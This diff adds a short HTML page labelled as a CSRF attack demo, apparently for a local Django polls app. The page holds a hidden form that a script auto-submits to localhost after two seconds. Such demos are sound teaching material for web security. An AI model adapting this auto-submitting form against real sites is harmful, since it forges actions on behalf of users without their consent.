@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Attack Demo</title>
+  </head>
+  <body>
+    <h1>Innocent Looking Page</h1>
+    <p>This is a demo of a CSRF attack.</p>
+
+    <h2>Automatic form</h2>
+    <!-- This form automatically submits when the page loads -->
+    <form
+      id="csrf-form"
+      action="http://localhost:8000/polls/report/"
+      method="POST"
+      style="border: 2px solid red; padding: 10px; background-color: #ffe6e6"
+    >
+      <p><strong>form submitting to victim site</strong></p>
+      <input
+        type="hidden"
+        name="data"
+        value="This was submitted via CSRF attack from an external site!"
+      />
+      <button type="submit">Click here (or it auto-submits)</button>
+    </form>
+
+    <script>
+      // Auto-submit after 2 seconds
+      setTimeout(function () {
+        document.getElementById("csrf-form").submit();
+      }, 2000);
+    </script>
+  </body>
+</html>
